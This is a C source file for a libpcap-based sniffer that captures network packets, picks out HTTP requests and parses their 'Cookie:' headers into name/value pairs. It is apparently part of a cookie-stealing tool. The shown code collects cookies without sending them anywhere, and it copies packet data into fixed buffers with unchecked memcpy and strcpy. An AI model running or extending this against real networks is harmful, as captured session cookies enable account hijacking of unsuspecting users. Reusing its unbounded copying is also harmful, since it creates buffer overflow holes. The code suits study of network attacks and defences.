#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>

#include "mypcap.h"
#include "sniff_cookies_lib.h"

extern pcap_t *handle;

/* ---------- Functions ---------- */

void signal_handler(int signal)
{
	switch (signal)
	{
		case SIGINT :
		case SIGTERM :
		case SIGKILL :
			if (handle != NULL)
				pcap_close(handle);

			printf("\n[*] Good Bye\n");
			exit(EXIT_SUCCESS);
			break;
	}
}

/*
	Callback function used by pcap_loop().
*/
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	Ether_hdr *eptr;
	Ip_hdr *ip;
	Tcp_hdr *tcp;
	void *http_payload_addr;
	char *http_cookies_addr;
	char *tok_cookie, *tok_val;
	char *saveptr1, *saveptr2;

	u_short ether_type;
	u_int tcp_header_size;
	u_int http_payload_size;
	static char http_payload[DEFAULT_TCP_PAYLOAD_SIZE];
	Host_cookies host_cookies;
	u_char i = 0;

	eptr = (Ether_hdr *) packet;
	ether_type = ntohs(eptr->ether_type);

	/* If the packet doesn't use IP, we stop the function */
	if (ether_type != ETHERTYPE_IP)
		return;

	ip = (Ip_hdr *)(packet + sizeof(Ether_hdr));

	/* If the packet doesn't use TCP, we stop the function */
	if (ip->ip_type != IPPROTO_TCP)
		return;

	tcp = (Tcp_hdr *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH);
	tcp_header_size = 4 * tcp->tcp_offset;

	http_payload_addr = (void *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);
	http_payload_size = header->len - (ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);

	memcpy(http_payload, http_payload_addr, http_payload_size);

	/* If the packet doesn't use HTTP, we stop the function */
	if ((strstr(http_payload, " HTTP/")) == NULL)
		return;

	/* If the packet doesn't use HTTP cookies, we stop the function */
	if ((http_cookies_addr = strstr(http_payload, "Cookie:")) == NULL)
		return;

	http_cookies_addr += 8;
	http_cookies_addr = strtok(http_cookies_addr, "\r\t\r\t");

	tok_cookie = strtok_r(http_cookies_addr, " ;", &saveptr1);

	while (tok_cookie != NULL)
	{
		tok_val = strtok_r(tok_cookie, "=", &saveptr2);
		strcpy(host_cookies.cookies[i].id, tok_val);
		tok_val = strtok_r(NULL, "=", &saveptr2);
		strcpy(host_cookies.cookies[i].val, tok_val);
	
		tok_cookie = strtok_r(NULL, " ;", &saveptr1);
		i++;
	}

}
